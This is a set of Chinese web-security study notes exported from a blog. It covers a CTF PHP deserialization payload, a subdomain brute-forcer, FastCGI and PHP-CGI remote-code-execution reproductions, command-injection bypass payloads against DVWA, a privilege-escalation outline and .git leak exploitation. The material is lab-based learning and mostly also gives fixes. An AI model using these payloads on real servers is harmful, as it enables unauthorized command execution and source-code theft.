<h5 id="Bugku-CTF-php伪协议-amp-反序列化"><a href="#Bugku-CTF-php伪协议-amp-反序列化" class="headerlink" title="Bugku CTF (php伪协议&amp;反序列化)"></a>Bugku CTF (php伪协议&amp;反序列化)</h5><p>首先我们根据源码提示，利用php伪协议得到反序列化相关代码。</p>
<img src="QQ截图20200114195646.png" style="zoom:67%;" />

<img src="QQ截图20200114195734.png" style="zoom:67%;" />

<p>这里看到了<strong>__string</strong>魔术方法：作用为将flag类作为字符串执行时会自动执行此函数。</p>
<p>在index.php又发现了关键函数unserialize();正则匹配函数preg_match对flag进行了匹配。</p>
<p>由于过滤不能通过文件包含的方式读取flag。但是我们可以自由的传入password的值。</p>
<p>所以我们就可以构造序列化对象：变量file=flag.php，传给password</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200114201936.png" alt=""></p>
<p>构造payload:</p>
<pre><code>?txt=php://input&amp;file=hint.php&amp;passwordO:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>即可得到flag.</p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://blog.szfszf.top/article/24/" target="_blank" rel="noopener">https://blog.szfszf.top/article/24/</a></p>
<p><a href="https://www.smi1e.top/php反序列化攻击拓展/" target="_blank" rel="noopener">https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/</a></p>
<p><a href="https://www.freebuf.com/column/154530.html" target="_blank" rel="noopener">https://www.freebuf.com/column/154530.html</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>python编写子域名爆破小工具</title>
    <url>/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/</url>
    <content><![CDATA[<h2 id="python编写子域名爆破小工具"><a href="#python编写子域名爆破小工具" class="headerlink" title="python编写子域名爆破小工具"></a>python编写子域名爆破小工具</h2><h4 id="字典生成工具编写"><a href="#字典生成工具编写" class="headerlink" title="字典生成工具编写"></a>字典生成工具编写</h4><p>这里主要使用的python的exrex模块：</p>
<p>此处有详细介绍，</p>
<pre><code>https://github.com/asciimoo/exrex</code></pre><p>这个模块的主要功能：</p>
<ul>
<li>生成所有匹配的字符串</li>
<li>生成随机匹配的字符串</li>
<li>计算匹配字符串的数量</li>
<li>简化正则表达式</li>
</ul>
<p>安装方法：</p>
<pre><code>pip install exrex</code></pre><p>我们主要使用该模块的generate()方法。</p>
<ul>
<li>generate(s,limit=20)</li>
<li>函数的作用：创建一个生成器，生成给定正则表达式的所有匹配字符串</li>
<li>参数s:正则表达式</li>
<li>limit：范围限制，要求limit的类型为整型数</li>
</ul>
<h5 id="简单的例子："><a href="#简单的例子：" class="headerlink" title="简单的例子："></a>简单的例子：</h5><pre><code>import exrex

web_dic=&#39;demo&#39;
dic_pass=&#39;admin&#39;
rule = &#39;{web_dic}[!@#]{dic_pass}&#39;
s = rule.format(web_dic=web_dic,dic_pass=dic_pass)
dics = list(exrex.generate(s))
for i in dics:
    print i</code></pre><h4 id="编写子域名爆破脚本"><a href="#编写子域名爆破脚本" class="headerlink" title="编写子域名爆破脚本"></a>编写子域名爆破脚本</h4><p>自己编写的理解脚本</p>
<pre><code>import exrex  #导入生成字典模块


def host_replace(hosts):         #域名处理方法
    if &#39;://&#39; in hosts:
        hosts = hosts.split(&#39;://&#39;)[1]
    if &#39;/&#39; in hosts: 
        hosts = hosts.replace(&#39;/&#39;,&#39;&#39;)              
    hosts = &quot;&quot;.join(hosts)
    return hosts

def dic_create(hosts):        #子域名字典生成方法
    web_white = [&#39;com&#39;, &#39;cn&#39;, &#39;gov&#39;, &#39;edu&#39;, &#39;org&#39;]
    web_dics = hosts.split(&#39;.&#39;)
    for web_dic in web_dics:
        if web_dic not in web_white:
            f_rule = open(&#39;rule.ini&#39;, &#39;r&#39;)
            for i in f_rule:
                dics = list(exrex.generate(web_dic+i.strip(&#39;\r\n&#39;)))
                for dic in dics:
                    if len(dic)&gt;3:
                        dic_out = open(&#39;mypass.txt&#39;,&#39;a+&#39;)
                        dic_out.write(dic+&#39;\r\n&#39;)
                        dic_out.close()
                        print dic
    f_rule.close()
def main():       #主函数
    hosts = raw_input(&quot;Write Your Hosts :&quot;)
    host =host_replace(hosts)
    dic_create(host)

if __name__ == &#39;__main__&#39;:
    main()</code></pre><p>参考：<a href="https://www.jianshu.com/p/a481a341eaa4" target="_blank" rel="noopener">https://www.jianshu.com/p/a481a341eaa4</a></p>
<p>子域名爆破脚本进阶版：</p>
<pre><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-

import dns.resolver
import threading
import Queue 
import optparse
import sys                    

queue = Queue.Queue()
lock = threading.Lock()

class GetSubDomain(threading.Thread):
    &quot;&quot;&quot;docstring for SubDomain&quot;&quot;&quot;
    def __init__(self, target,queue,outfile):
        threading.Thread.__init__(self)
        self.target = target
        self.queue = queue
        self.rsv = dns.resolver.Resolver()
        outfile = target + &#39;.txt&#39; if not outfile else outfile
        self.f = open(&#39;./output/&#39;+outfile,&#39;a+&#39;)
        self.ip_list = []

    def _scan(self):
        while not self.queue.empty():
            self.ip_list = []
            ips = None
            sub_domain = self.queue.get() + &#39;.&#39; + self.target
            for _ in range(3):
                try:
                    answers = self.rsv.query(sub_domain)
                    if answers:
                        for answer in answers:
                            if answer.address not in self.ip_list:
                                self.ip_list.append(answer.address)
                except dns.resolver.NoNameservers, e:
                    break
                except Exception, e:
                    pass
            if len(self.ip_list)&gt;0:
                ips = &#39;,&#39;.join(self.ip_list)
                msg = sub_domain.ljust(30) + ips + &#39;\n&#39;
                lock.acquire()
                print msg
                self.f.write(msg)
                lock.release()
            self.queue.task_done()

    def run(self):
        self._scan()

def get_target(domain_list):
    targets = []
    for line in open(domain_list,&#39;r&#39;):
        if line:
            targets.append(line.strip())
    return targets

def get_sub_queue(sub_file): #得到所有子域名的queue
    for line in open(sub_file,&#39;r&#39;):
        if line:
            queue.put(line.strip())

def main():
    parser = optparse.OptionParser()
    parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;,
        type=&#39;string&#39;, help=&#39;Get a single top-level domain names.&#39;)
    parser.add_option(&#39;-l&#39;, &#39;--list&#39;, dest=&#39;domain_list&#39;,
        type=&#39;string&#39;, help=&#39;Top-level domain name list.&#39;)
    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;sub_file&#39;, default=&#39;sub.txt&#39;,
        type=&#39;string&#39;, help=&#39;Dict file used to brute sub names&#39;)
    parser.add_option(&#39;-t&#39;, &#39;--threads&#39;, dest=&#39;threads_num&#39;, default=60, 
        type=&#39;int&#39;, help=&#39;Number of threads. default = 60&#39;)
    parser.add_option(&#39;-o&#39;, &#39;--outfile&#39;, dest=&#39;outfile&#39;, default=None,
        type=&#39;string&#39;, help=&#39;Output file name. default is {target}.txt&#39;)

    (options, args) = parser.parse_args()
    if options.url:
        urls = [options.url]
    elif options.domain_list:
        urls = get_target(options.domain_list)
    else:
        parser.print_help()
        print &quot;Example: &quot;
        print &quot;\tpython getsub.py -u baidu.com&quot;
        print &quot;\tpython getsub.py -l domain.txt -f sub.txt -t 50&quot;
        sys.exit(0)

    for url in urls:
        get_sub_queue(options.sub_file)
        for x in xrange(1,options.threads_num+1):
            t = GetSubDomain(url,queue,options.outfile)
            t.setDaemon(True)
            t.start()
        queue.join()

if __name__ == &#39;__main__&#39;:
    main()</code></pre>]]></content>
      <categories>
        <category>python学习</category>
      </categories>
  </entry>
  <entry>
    <title>其他中间件漏洞</title>
    <url>/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="其它中间件相关漏洞"><a href="#其它中间件相关漏洞" class="headerlink" title="其它中间件相关漏洞"></a>其它中间件相关漏洞</h2><h4 id="FastCGI未授权访问、任意命令执行"><a href="#FastCGI未授权访问、任意命令执行" class="headerlink" title="FastCGI未授权访问、任意命令执行"></a>FastCGI未授权访问、任意命令执行</h4><p><strong>1、 漏洞简介及成因</strong></p>
<p>服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。</p>
<p>参考P牛文章：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p><strong>2、 漏洞复现</strong></p>
<p>使用vulhub实验环境，启动实验环境。</p>
<pre><code>cd /vulhub/fpm
docker-compose build &amp;&amp; docker-compose up -d</code></pre><p><strong>EXP</strong>:<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<p>在攻击机使用命令python fpm.py 192.168.237.136 /etc/passwd，观察返回结果。</p>
<p><a href="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png!small" alt="img"></a></p>
<p>由于访问非*.PHP文件，所以返回结果403。</p>
<p>使用命令执行一个默认存在的 php 文件。</p>
<pre><code>python fpm.py 192.168.237.136 /usr/local/lib/php/PEAR.php</code></pre><p><a href="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png!small" alt="img"></a></p>
<p>利用命令进行任意命令执行复现。</p>
<pre><code>python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `pwd`; ?&gt;&#39;
python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ifconfig`; ?&gt;&#39;
python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ls`; ?&gt;&#39;</code></pre><p><a href="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small" alt="img"></a></p>
<p><strong>3、 漏洞修复</strong></p>
<p>更改默认端口</p>
<h3 id="（二）-PHPCGI远程代码执行"><a href="#（二）-PHPCGI远程代码执行" class="headerlink" title="（二） PHPCGI远程代码执行"></a>（二） PHPCGI远程代码执行</h3><p><strong>1、 漏洞简介及成因</strong></p>
<p>在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。</p>
<p>此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。</p>
<p><a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a><br>p牛讲的很详细：<a href="https://vulhub.org/#/environments/php/CVE-2012-1823/" target="_blank" rel="noopener">https://vulhub.org/#/environments/php/CVE-2012-1823/</a></p>
<p><strong>2、 漏洞复现</strong></p>
<p>cgi模式下有如下一些参数可用：</p>
<pre><code>-c 指定php.ini文件的位置
-n 不要加载php.ini文件
-d 指定配置项
-b 启动fastcgi进程
-s 显示文件源码
-T 执行指定次该文件
-h和-? 显示帮助</code></pre><p>通过使用<code>-d</code>指定<code>auto_prepend_file</code>来制造任意文件包含漏洞，执行任意代码：<br><code>auto_prepend_file</code>与<code>auto_append_file</code>:将文件require到所有页面的顶部与底部。<br>空格用<code>+</code>或<code>%20</code>代替，<code>=</code>用url编码代替。<br>payload：<code>-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p>
<p>使用vulhub实验环境，启动环境。</p>
<p>访问<a href="http://192.168.139.129:8080/index.php。" target="_blank" rel="noopener">http://192.168.139.129:8080/index.php。</a></p>
<p><a href="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png!small" alt="img"></a></p>
<p>抓包，修改包。</p>
<p><a href="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png!small" alt="img"></a></p>
<p>命令成功执行。</p>
<p><strong>3、 漏洞修复</strong></p>
<p>三种方法：</p>
<p>1）升级php版本；（php-5.3.12以上版本）;</p>
<p>2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。</p>
<p>具体做法：</p>
<p>修改http.conf文件，找到<Directory/>增加以下三行</p>
<p>RewriteEngine on</p>
<p>RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]</p>
<p>RewriteRule ^(.*) $1? [L]</p>
<p>重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。</p>
<p>3）打上php补丁。</p>
<p>补丁下载地址:<a href="https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a></p>
]]></content>
      <categories>
        <category>中间件漏洞</category>
      </categories>
      <tags>
        <tag>FastCGI</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行/代码执行漏洞学习</title>
    <url>/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/</url>
    <content><![CDATA[<h2 id="代码执行-命令执行漏洞学习笔记-靶场实战"><a href="#代码执行-命令执行漏洞学习笔记-靶场实战" class="headerlink" title="代码执行+命令执行漏洞学习笔记+靶场实战"></a>代码执行+命令执行漏洞学习笔记+靶场实战</h2><p>[TOC]</p>
<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="一、什么是命令执行漏洞"><a href="#一、什么是命令执行漏洞" class="headerlink" title="一、什么是命令执行漏洞"></a>一、什么是命令执行漏洞</h4><h5 id="命令执行漏洞概念："><a href="#命令执行漏洞概念：" class="headerlink" title="命令执行漏洞概念："></a>命令执行漏洞概念：</h5><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
<h5 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul>
<li>继承web服务器程序的权限，去执行系统命令。</li>
<li>继承web服务器程序的权限，读取文件</li>
<li>反弹shell</li>
<li>控制整个网站甚至控制整个服务器</li>
</ul>
<p><strong>常用的Linux命令总结：</strong></p>
<pre><code>ls cd mkdir rm cp mv touch cat more chmod find vi du ifconfig ping netstat lsof shutdown uname kill...</code></pre><h5 id="命令执行与代码执行的区别："><a href="#命令执行与代码执行的区别：" class="headerlink" title="命令执行与代码执行的区别："></a>命令执行与代码执行的区别：</h5><p>代码执行是通过调用<strong>服务器网站代码</strong>进行执行，而命令注入则是调用<strong>操作系统命令</strong>进行执行。</p>
<h5 id="常见的命令执行函数："><a href="#常见的命令执行函数：" class="headerlink" title="常见的命令执行函数："></a>常见的命令执行函数：</h5><ul>
<li><p><strong>system()</strong></p>
<img src="QQ截图20200121111755.png" style="zoom: 67%;" /> 



</li>
</ul>
<ul>
<li><p><strong>passthru()</strong></p>
<img src="QQ截图20200121111928.png" style="zoom: 67%;" />



</li>
</ul>
<ul>
<li><strong>exec()</strong></li>
</ul>
  <img src="QQ截图20200121112035.png" style="zoom:67%;" />



<ul>
<li><strong>shell_exec()</strong></li>
</ul>
  <img src="QQ截图20200121112153.png" style="zoom:67%;" />



<ul>
<li><strong>`反引号</strong></li>
</ul>
  <img src="QQ截图20200121112345.png" style="zoom:67%;" />



<ul>
<li><p><strong>ob_start()</strong></p>
</li>
<li><p><strong>popen()</strong></p>
</li>
<li><p><strong>proc_oprn()</strong></p>
</li>
<li><p>。。。</p>
</li>
</ul>
<h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><p><strong>1.空格过滤绕过</strong></p>
<p>空格可以用以下字符替换</p>
<pre><code>&lt;    &lt;&gt;   %20(space)   %09(tab)  $IFS$9  ${IFS}  $IFS等</code></pre><p>  测试：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200121121710.png" alt=""></p>
<p>2.<strong>命令分隔符</strong></p>
<pre><code>linux:%0a、%0d、;、&amp;、|、&amp;&amp;、||、
window: %0a、&amp;、|、%1a、</code></pre><img src="QQ截图20200121121840.png" style="zoom:67%;" />

<p><strong>%0a符号：</strong>换行符                 <strong>%0d符号：</strong>回车符             <strong><code>;</code>符号：</strong>起连续指令的功能        </p>
<p><strong>&amp;  &amp;&amp; ||的区别</strong></p>
<p>（1）&amp; 表示先执行CMD1 再执行CMD2，这里不考虑CMD1是否成功。使用CMD1 &amp; CMD2</p>
<p>（2）&amp;&amp; 表示先执行CMD1，成功后再执行CMD，否则不执行CMD2。使用CMD1 &amp;&amp; CMD2</p>
<p>（3）|| 先执行CMD1，CMD1执行成功就不再执行CMD2，CMD1执行失败则执行CMD2。使用CMD1 || CMD2</p>
<p>3.<strong>敏感字符绕过</strong></p>
<ul>
<li><p>利用变量绕过</p>
<img src="QQ截图20200121122131.png" style="zoom:67%;" />
</li>
<li><p>利用base64编码绕过</p>
<img src="QQ截图20200121122557.png" style="zoom:67%;" />



</li>
</ul>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>1.能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disable_functions中禁用</p>
<ol start="2">
<li>在进入命令执行的函数或方法之前，对参数进行过滤。</li>
<li>参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</li>
</ol>
<h4 id="DVWA-命令注入部分"><a href="#DVWA-命令注入部分" class="headerlink" title="DVWA (命令注入部分)"></a>DVWA (命令注入部分)</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h5><p>由源码可知，要求我们输入ip地址，未进行任何过滤，我们在ip地址后使用&amp;&amp;拼接想要执行的命令。</p>
<pre><code>127.0.0.1&amp;&amp;net user</code></pre><h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><pre><code>&lt;?php 
if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { 
    // Get input 
    $target = $_REQUEST[ &#39;ip&#39; ]; 
    // Set blacklist 
    $substitutions = array( 
        &#39;&amp;&amp;&#39; =&gt; &#39;&#39;, 
        &#39;;&#39;  =&gt; &#39;&#39;, 
    ); 
    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
    // Determine OS and execute the ping command. 
    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { 
        // Windows 
        $cmd = shell_exec( &#39;ping  &#39; . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); 
    } 
    // Feedback for the end user 
    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 
} 
?&gt;</code></pre><p><strong>这里把&amp;&amp;过滤了。。但是我可以使用一个&amp;来绕过。。127.0.0.1&amp;net user</strong></p>
<p><strong>当然也可以使用 ||  |效果相同</strong></p>
<h5 id="high"><a href="#high" class="headerlink" title="high:"></a>high:</h5><pre><code>&lt;?php 
if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { 
    // Get input 
    $target = trim($_REQUEST[ &#39;ip&#39; ]); 
    // Set blacklist 
    $substitutions = array( 
        &#39;&amp;&#39;  =&gt; &#39;&#39;, 
        &#39;;&#39;  =&gt; &#39;&#39;, 
        &#39;|  &#39; =&gt; &#39;&#39;, 
        &#39;-&#39;  =&gt; &#39;&#39;, 
        &#39;$&#39;  =&gt; &#39;&#39;, 
        &#39;(&#39;  =&gt; &#39;&#39;, 
        &#39;)&#39;  =&gt; &#39;&#39;, 
        &#39;`&#39;  =&gt; &#39;&#39;, 
        &#39;||&#39; =&gt; &#39;&#39;, 
    ); 
    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
    // Determine OS and execute the ping command. 
    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { 
        // Windows 
        $cmd = shell_exec( &#39;ping  &#39; . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); 
    } 
    // Feedback for the end user 
    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 
} 
?&gt; </code></pre><p>还是黑名单。。。，发现|符号还是可以使用   所以     <code>127.0.0.1| net user</code> 成功</p>
<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><h5 id="什么是代码执行漏洞？"><a href="#什么是代码执行漏洞？" class="headerlink" title="什么是代码执行漏洞？"></a>什么是代码执行漏洞？</h5><p>   当应用在调用一些能够将字符转化为代码的函数（如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。</p>
<h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p>PHP:eval()    assert()、  preg_replace() 、 call_user_func() 、  array_map() </p>
<p>Python:exec</p>
<p>asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt;</p>
<h5 id="漏洞危害：-1"><a href="#漏洞危害：-1" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul>
<li>执行代码</li>
<li>让网站写shell</li>
<li>甚至控制服务器</li>
</ul>
<h5 id="常见种类"><a href="#常见种类" class="headerlink" title="常见种类"></a>常见种类</h5><ul>
<li>代码执行函数</li>
<li>文件包含代码注入</li>
<li>正则表达代码注入</li>
<li>动态代码执行</li>
<li>其他</li>
</ul>
<h5 id="漏洞分类："><a href="#漏洞分类：" class="headerlink" title="漏洞分类："></a>漏洞分类：</h5><p>执行代码的函数：eval、assert</p>
<p>callback函数：preg_replace + /e模式</p>
<p>反序列化：unserialize()反序列化</p>
<h5 id="示例一：php-eval代码执行"><a href="#示例一：php-eval代码执行" class="headerlink" title="示例一：php eval代码执行"></a>示例一：php eval代码执行</h5><p>本地新建test.php</p>
<img src="QQ截图20200124110825.png" style="zoom:67%;" />

<p>我们本地网址执行phpinfo()</p>
<img src="QQ截图20200124111032.png" style="zoom:67%;" />



<h5 id="示例二：-eval闭合代码执行"><a href="#示例二：-eval闭合代码执行" class="headerlink" title="示例二：  eval闭合代码执行"></a>示例二：  eval闭合代码执行</h5><img src="QQ截图20200124111354.png" style="zoom: 80%;" />

<p><img src="QQ%E6%88%AA%E5%9B%BE20200124111639.png" alt=""></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>代码执行/命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>纵观渗透测试中的提权</title>
    <url>/2020/04/03/ti-quan-fang-shi-zong-jie/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要是为了总结渗透测试中我们常见的提权的思路与方式，不作详细步骤解释。</p>
<h3 id="提权的分类"><a href="#提权的分类" class="headerlink" title="提权的分类"></a>提权的分类</h3><p>提权的分类方法和分类角度有很多，这里我们选几种角度对其进行分类</p>
<h3 id="windows提权："><a href="#windows提权：" class="headerlink" title="windows提权："></a>windows提权：</h3><h4 id="一、本地提权"><a href="#一、本地提权" class="headerlink" title="一、本地提权"></a>一、本地提权</h4><h5 id="溢出提权："><a href="#溢出提权：" class="headerlink" title="溢出提权："></a>溢出提权：</h5><h6 id="1-远程溢出"><a href="#1-远程溢出" class="headerlink" title="1.远程溢出"></a>1.远程溢出</h6><p>​      远程溢出提权是指攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用响应的溢出程序，即可获取到远程服务器的root权限。</p>
<p>​    攻击者在攻击服务器时，使用远程溢出这种溢出攻击这种攻击手段是比较少的，服务器通常都打了漏洞补丁，这样旧的溢出漏洞一般不会再起作用，而新的溢出漏洞少之又少，可以说远程溢出漏洞已经”日落西山”了。</p>
<h6 id="2-本地溢出"><a href="#2-本地溢出" class="headerlink" title="2.本地溢出"></a>2.本地溢出</h6><p> 本地溢出提权首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限。</p>
<h5 id="Getpass-提权"><a href="#Getpass-提权" class="headerlink" title="Getpass 提权"></a>Getpass 提权</h5><h5 id="hash传递入侵"><a href="#hash传递入侵" class="headerlink" title="hash传递入侵"></a>hash传递入侵</h5><h5 id="lpk提权"><a href="#lpk提权" class="headerlink" title="lpk提权"></a>lpk提权</h5><h4 id="二、数据库提权"><a href="#二、数据库提权" class="headerlink" title="二、数据库提权"></a>二、数据库提权</h4><h5 id="1-mysql提权"><a href="#1-mysql提权" class="headerlink" title="1.mysql提权"></a>1.mysql提权</h5><ul>
<li><strong>功能型：</strong>udf提权</li>
<li><strong>技巧型：</strong>启动项提权</li>
<li><strong>漏洞型：</strong>mof提权</li>
</ul>
<h5 id="2-SQL-Server提权"><a href="#2-SQL-Server提权" class="headerlink" title="2.SQL Server提权"></a>2.SQL Server提权</h5><h5 id="3-Oracle提权"><a href="#3-Oracle提权" class="headerlink" title="3.Oracle提权"></a>3.Oracle提权</h5><ul>
<li>虚拟主机提权</li>
<li>星外提权</li>
<li>西部数码提权</li>
<li>华众虚拟主机提权</li>
</ul>
<h4 id="三、第三方软件提权"><a href="#三、第三方软件提权" class="headerlink" title="三、第三方软件提权"></a>三、第三方软件提权</h4><h5 id="1-FTP提权"><a href="#1-FTP提权" class="headerlink" title="1.FTP提权"></a>1.FTP提权</h5><ul>
<li>serv-u提权</li>
<li>G6-FTP提权</li>
<li>FileZilla提权</li>
<li>FlashFXP提权</li>
<li>PcAnywhere提权</li>
<li>Xlight FTP Server提权</li>
</ul>
<h5 id="2-远程软件提权"><a href="#2-远程软件提权" class="headerlink" title="2.远程软件提权"></a>2.远程软件提权</h5><ul>
<li>vnc</li>
<li>radmin</li>
</ul>
<h5 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h5><ul>
<li>Magic Winmail提权</li>
<li>navicat提权</li>
<li>zend</li>
<li>搜狗输入法提权</li>
<li>PR提权详解</li>
<li>巴西烤肉提权</li>
<li>利用360提权</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>提权方式</tag>
      </tags>
  </entry>
  <entry>
    <title>敏感信息泄露常见类型</title>
    <url>/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/</url>
    <content><![CDATA[<h2 id="敏感信息泄露-源码泄露-学习笔记"><a href="#敏感信息泄露-源码泄露-学习笔记" class="headerlink" title="敏感信息泄露/源码泄露  学习笔记"></a>敏感信息泄露/源码泄露  学习笔记</h2><h4 id="1-什么是敏感数据？"><a href="#1-什么是敏感数据？" class="headerlink" title="1.什么是敏感数据？"></a>1.什么是敏感数据？</h4><p>  敏感数据包括但不限于：口令、密钥、证书、会话标识、Licence、隐私数据、授权凭据、个人数据等、在程序文件、配置文件、日志文件、备份文件及数据库中都有可能包含敏感数据。</p>
<h4 id="1、-git文件泄露漏洞"><a href="#1、-git文件泄露漏洞" class="headerlink" title="1、.git文件泄露漏洞"></a>1、.git文件泄露漏洞</h4><p><strong>漏洞描述：</strong>git在初始化项目的时候，会在项目的根目录（git rev-parse  –show-toplevel查看）创建一个名为<code>.git</code>的隐藏文件夹，里面包含了本地所有commit的历史纪录，如果无意间将这个目录置于Web的路径下让用户可以访问，那么也就泄露了几乎所有的源代码和其他的敏感信息。可能泄露的内容：</p>
<ul>
<li>所有该项目的源码</li>
<li>私有仓库的地址</li>
<li>私密的配置信息。</li>
<li>所有commiter的邮箱账号信息</li>
<li>内部的账号和密码。。</li>
</ul>
<p><strong>检测方式：</strong>   工具：GitHack  使用方法：</p>
<p>​                 <code>python GitHack.py  http://网站地址/.git/</code></p>
<p><strong>示例：</strong>来源(i春秋web Hello world);</p>
<p>进入题目，查看源码，只发现一个js文件</p>
<img src="QQ截图20200119121609.png" style="zoom:50%;" />

<p>我们尝试使用Githack来判断网站是否有.git泄露。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200119121109.png" alt=""></p>
<p>可见该网站下存在.git泄露，并且在工具文件夹下得到了泄露的文件内容。</p>
<img src="QQ截图20200119121116.png" style="zoom:50%;" />

<h4 id="2、-hg源码泄露漏洞"><a href="#2、-hg源码泄露漏洞" class="headerlink" title="2、.hg源码泄露漏洞"></a>2、.hg源码泄露漏洞</h4><p><strong>漏洞描述：</strong><a href="https://www.mercurial-scm.org/" target="_blank" rel="noopener">Mercurial</a>的意思是水银, 所以缩写成hg(汞), 也是一个版本管理软件. 用法和git有点类似, 但也保留了svn命令简明的特点, 而且原生地支持Windows/MacOS/Linux三大平台, 不像git需要MinGW才得以运行, 所以当今也有不少人偏向于用hg做版本控制.</p>
<p><strong>检测方式：</strong>工具dvcs-ripper,使用方法：<code>rip-hg.pl -v -u http://域名/.hg/</code></p>
